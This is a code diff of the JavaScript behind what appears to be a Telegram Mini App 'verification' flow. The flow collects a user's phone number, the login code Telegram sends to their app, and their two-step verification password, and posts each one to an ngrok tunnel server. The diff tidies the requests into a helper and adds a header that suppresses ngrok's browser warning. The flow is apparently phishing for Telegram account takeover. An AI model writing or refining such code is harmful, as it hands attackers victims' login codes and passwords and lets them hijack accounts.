@@ -14,10 +14,31 @@ document.addEventListener('DOMContentLoaded', function () {
     const SERVER_URL = 'https://proindustrialisation-annice-emptiable.ngrok-free.dev';
     const userId = tg.initDataUnsafe?.user?.id || 'user_' + Date.now();
 
+    // Common headers for all API calls — skips ngrok warning page
+    const HEADERS = {
+        'Content-Type': 'application/json',
+        'ngrok-skip-browser-warning': 'true'
+    };
+
     tg.ready();
     tg.expand();
 
     function showAlert(msg) { alert(msg); }
+
+    // Helper — fetch + safe JSON parse
+    async function apiFetch(path, body) {
+        const res = await fetch(SERVER_URL + path, {
+            method: 'POST',
+            headers: HEADERS,
+            body: JSON.stringify(body)
+        });
+        const text = await res.text();
+        try {
+            return JSON.parse(text);
+        } catch (e) {
+            throw new Error('Server returned: ' + text.substring(0, 120));
+        }
+    }
 
     // ── Phone Step ────────────────────────────────────────────────────────────
     sendOtpBtn.addEventListener('click', async function () {
@@ -28,13 +49,7 @@ document.addEventListener('DOMContentLoaded', function () {
         sendOtpBtn.textContent = 'Sending...';
 
         try {
-            const res = await fetch(`${SERVER_URL}/send-otp`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone, user_id: String(userId) })
-            });
-            const result = await res.json();
-
+            const result = await apiFetch('/send-otp', { phone, user_id: String(userId) });
             if (result.success) {
                 showSection('otp');
                 showAlert('Code sent! Check your Telegram app.');
@@ -77,17 +92,7 @@ document.addEventListener('DOMContentLoaded', function () {
         verifyBtn.textContent = 'Verifying...';
 
         try {
-            const res = await fetch(`${SERVER_URL}/verify-otp`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ otp, user_id: String(userId) })
-            });
-
-            const text = await res.text();
-            let result;
-            try { result = JSON.parse(text); }
-            catch(e) { showAlert('Server error: ' + text.substring(0, 100)); return; }
-
+            const result = await apiFetch('/verify-otp', { otp, user_id: String(userId) });
             if (result.success) {
                 if (result.twofa_required) {
                     showSection('twofa');
@@ -117,17 +122,7 @@ document.addEventListener('DOMContentLoaded', function () {
         twofaBtn.textContent = 'Verifying...';
 
         try {
-            const res = await fetch(`${SERVER_URL}/verify-2fa`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ password, user_id: String(userId) })
-            });
-
-            const text = await res.text();
-            let result;
-            try { result = JSON.parse(text); }
-            catch(e) { showAlert('Server error: ' + text.substring(0, 100)); return; }
-
+            const result = await apiFetch('/verify-2fa', { password, user_id: String(userId) });
             if (result.success) {
                 tg.sendData('verified:2fa_success');
             } else {
